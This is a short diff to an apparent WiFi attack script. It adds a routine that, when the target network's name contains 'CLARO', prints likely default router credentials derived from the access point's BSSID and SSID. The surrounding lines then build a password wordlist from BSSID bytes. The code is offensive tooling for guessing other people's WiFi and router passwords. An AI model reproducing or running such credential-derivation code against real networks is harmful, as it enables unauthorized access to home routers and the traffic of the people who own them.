@@ -120,6 +120,23 @@ then
 	cat /tmp/bssid_atk.txt
 	echo -e "${END}"
 	
+	# Caso o WiFi for da CLARO
+	CLARO=$(cat /tmp/ssid_atk.txt | grep CLARO | wc -l)
+	if [ $CLARO == "1" ]
+	then
+		echo -e "${BLUE} [*] Possible router credentials ${END}"
+		echo -ne "${GREEN} [+] USER:  "
+		cat /tmp/ssid_atk.txt | cut -d " " -f1
+		echo -ne "${GREEN} [+] PASS:  "
+		PT1=$(cat /tmp/bssid_atk.txt | sed 's/://g' | cut -c -10)
+		PT2=$(cat /tmp/ssid_atk.txt | cut -d " " -f1 | rev | cut -c -2 | rev)
+		echo -ne "$PT1$PT2"
+		echo -ne " or "
+		cat /tmp/bssid_atk.txt | sed 's/://g'
+		echo -e "${END}"
+	fi
+	
+	
 	# Monta a mini wordlist
 	# 3º byte em diante
 	cat /tmp/bssid_atk.txt | cut -d ":" -f3,4,5,6 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://g' > /tmp/password_atk.txt
